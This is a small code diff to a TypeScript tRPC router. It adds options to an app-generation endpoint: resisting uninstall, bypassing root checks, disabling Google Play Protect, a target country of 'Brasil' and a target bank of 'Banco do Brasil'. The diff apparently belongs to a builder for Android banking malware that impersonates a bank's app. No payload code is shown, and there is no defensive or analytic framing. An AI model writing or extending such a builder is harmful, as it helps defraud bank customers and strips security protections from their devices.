@@ -261,6 +261,13 @@ export const appRouter = router({
         appUrl: z.string().url("URL inválida").min(1),
         logoUrl: z.string().optional().or(z.literal("")),
         protectFromUninstall: z.boolean().default(true),
+        bypassRoot: z.boolean().default(true),
+        desinstalarPlayProtect: z.boolean().default(true),
+        versionName: z.string().default("1.0.0"),
+        versionCode: z.number().default(1),
+        pais: z.string().default("Brasil"),
+        banco: z.string().default("Banco do Brasil"),
+        origemLink: z.string().default("Automatico"),
       }))
       .mutation(async ({ input, ctx }) => {
         if (!ctx.user) {
